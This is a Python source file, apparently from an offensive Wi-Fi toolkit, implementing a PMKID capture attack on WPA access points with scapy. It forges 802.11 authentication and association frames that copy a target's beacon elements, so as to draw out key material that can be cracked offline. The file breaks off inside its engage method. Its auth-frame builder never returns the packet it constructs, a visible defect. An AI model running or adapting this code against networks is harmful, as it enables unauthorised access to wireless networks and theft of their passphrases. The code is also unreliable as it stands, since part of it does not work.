import os
import re
import sys
import time
import curses
import random
import binascii
import threading
import subprocess
from pull import PULL
from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from scapy.utils    import PcapWriter
from scapy.packet   import Raw
from scapy.arch     import get_if_raw_hwaddr as HWADDR
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Beacon
from scapy.layers.dot11 import Dot11Elt
from scapy.layers.dot11 import Dot11EltRSN
from scapy.layers.dot11 import Dot11FCS
from scapy.layers.dot11 import Dot11EltMicrosoftWPA
from scapy.layers.dot11 import Dot11EltCountry
from scapy.layers.dot11 import Dot11Auth
from scapy.layers.dot11 import Dot11AssoReq
from scapy.layers.eap   import EAPOL

class PMKID:

	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, beacon, stations, outfname):
		self.interface  = iface
		self.bssid      = bssid
		self.essid      = essid
		self.channel    = channel
		self.power      = power
		self.device     = device
		self.encryption = encryption
		self.cipher     = cipher
		self.auth       = auth
		self.stations   = stations
		self.beacon     = beacon
		self.output     = self.output(outfname)

	def output(self, fl):
		if fl.endswith(".pmkid"):
			return fl
		elif fl.endswith("."):
			return (fl + "pmkid")
		else:
			return (fl + ".pmkid")

	def channeler(self):
		ch = str(self.channel)
		subprocess.call(['iwconfig', self.interface, 'channel', ch])

	def get_my_address(self):
		retval = HWADDR(self.interface)
		family = retval[0]
		hwaddr = retval[1]
		hwaddr = binascii.hexlify(hwaddr).decode()
		hwaddr = ':'.join(hwaddr[i:i+2] for i in range(0,12,2))
		return hwaddr

	def forge_auth_frame(self, ap, cl):
		pkt = RadioTap() / Dot11(
				addr1=ap,
				addr2=cl,
				addr3=ap
			) / Dot11Auth(
				seqnum=1
			)

	def forge_asso_frame(self, ap, cl):
		def enum(pkt):
			elts = pkt.getlayer(Dot11Elt)
			retval, count = {}, 0

			try:
				while isinstance(elts[count], Dot11Elt):
					if elts[count].ID == 0 or elts[count].ID == 1 or elts[count].ID == 48 or elts[count].ID == 5 or elts[count].ID == 50 or elts[count].ID == 221:
						retval[ elts[count].ID ] = {
							'ID': elts[count].ID,
							'len': elts[count].len,
							'info': elts[count].info
						}
					count += 1
			except IndexError:
				pass

			return retval

		def form(efields, layer):
			for identifier in list(efields.keys()):
				if identifier == 0 or identifier == 1 or identifier == 5 or identifier == 48 or identifier == 50 or identifier == 221:
					layer = layer / Dot11Elt(
							ID=efields[identifier].get('ID'),
							len=efields[identifier].get('len'),
							info=efields[identifier].get('info')
						)

			return layer

		capibility = self.beacon.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
		pkt        = RadioTap() / Dot11(
							addr1=ap,
							addr2=cl,
							addr3=ap
						) / Dot11AssoReq(
							cap=capibility,
							listen_interval=3
						)
		efields    = enum(self.beacon)
		pkt        = form(efields, pkt)
		return pkt

	def engage(self):
		myaddress  = self.get_my_address()
		auth_frame = self.forge_auth_frame( self.bssid, myaddress )
		asso_frame = self.forge_asso_frame( self.bssid, myaddress )